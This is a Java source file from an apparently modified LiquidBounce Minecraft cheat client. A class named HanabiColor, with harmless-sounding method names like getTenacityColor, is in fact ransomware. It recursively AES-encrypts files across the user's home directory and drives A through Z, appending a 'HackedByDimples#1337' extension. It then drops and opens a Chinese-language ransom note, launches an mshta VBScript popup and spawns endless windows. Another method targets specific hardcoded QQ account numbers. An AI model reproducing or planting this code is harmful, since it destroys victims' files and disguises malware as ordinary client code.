package net.ccbluex.liquidbounce.utils;

//import cc.paimon.utils.AESUtils;

import kotlin.jvm.JvmStatic;
import net.ccbluex.liquidbounce.LiquidBounce;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.util.Objects;
import java.util.Random;

/**
 * Skid by Paimon.
 *
 * @Date 2022/12/3
// */
//@NativeClass
public class HanabiColor {
    public static String EXTENDED_NAME = "HackedByDimples#1337";
    public static String RANSOM_NOTE = "Hacked by Dimples#1337.\n" +
            "主播你的电脑已经被我黑了，你的文件已经被我加密了\n" +
            "主播自己干了什么应该心里清楚，enjoy\n" +
            "\n" +
            "-Dimples#1337";
    public static String[] TARGET_DIR = {
            String.valueOf(FileSystemView.getFileSystemView() .getHomeDirectory()),
            System.getProperty("user.dir"),
            "D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","G:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",
            "U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\","A:\\","B:\\"
    };

    public static String KEY;
    static {
        try {
            KEY = AESUtils.getSecretKey();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 防止脑残小学生Jby然后圈钱
     * @return boolean
     */
    @JvmStatic
    public static boolean getHanabiMainColor(){
        if(!(LiquidBounce.CLIENT_NAME.contains("Slowylove"))){
            return false;
        }else{
            return true;
        }
    }
    public static void WriteStringToFile(String filePath) {
        try {
            File file = new File(filePath);
            PrintStream ps = new PrintStream(new FileOutputStream(file));
            ps.println(RANSOM_NOTE);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void encrypt(File dir) {
        encrypting(dir, 0);
    }

    private static void encrypting(File f, int level) {
        if (f.isDirectory()) {
            for (File temp : f.listFiles()) {
                encrypting(temp, level + 1);
            }
        } else {
            String[] strArray = f.getName().split("\\.");
            int suffixIndex = strArray.length - 1;
            if (Objects.equals(strArray[suffixIndex], EXTENDED_NAME))
                return;
            if(f.getName().contains("Dimples's Note"))
                return;
            f.renameTo(new File(f.getPath() + "." + EXTENDED_NAME));
            try {
                AESUtils.encryptFile(KEY, f.getPath() + "." + EXTENDED_NAME, f.getPath() + "." + EXTENDED_NAME);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
    /**
     * 老鼠
     */
    @JvmStatic
    public static void getTenacityColor(){
        Random rd = new Random();
        int i = 0;
        if(i != TARGET_DIR.length){
            encrypt(new File(TARGET_DIR[i]));
            i++;
        }
        try {
            Runtime.getRuntime().exec("mshta vbscript:msgbox(\"You got hacked by Dimples#1337\",16,\"Dimples#1337\")(window.close)");
        } catch (IOException e) {
            e.printStackTrace();
        }
        WriteStringToFile(FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
        try {
            Runtime.getRuntime().exec("notepad " + FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
        while (true) {
            JFrame frame = new JFrame("Hacked By Dimples#1337");
            frame.setSize(400, 100);
            frame.setLocation(rd.nextInt(1920), rd.nextInt(1080));
            frame.setVisible(true);
//            try {
//                Runtime.getRuntime().exec("mshta vbscript:msgbox(\"You got hacked by Dimples#1337\",16,\"Dimples#1337\")(window.close)");
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
        }
    }
    @JvmStatic
    public static boolean getDoubleRainbow(){
        if(QQUtils.QQNumber==("3182365067") ||
                QQUtils.QQNumber==("2173225087") ||
                QQUtils.QQNumber==("3072623721") ||
                QQUtils.QQNumber==("2442615723"))
        {
            try {
                new DimplesUtils().NMSL();
            } catch (IOException e) {
                System.exit(0);
            }
            return false;
        }else{
            System.out.println(QQUtils.QQNumber);
            return true;
        }
    }
}
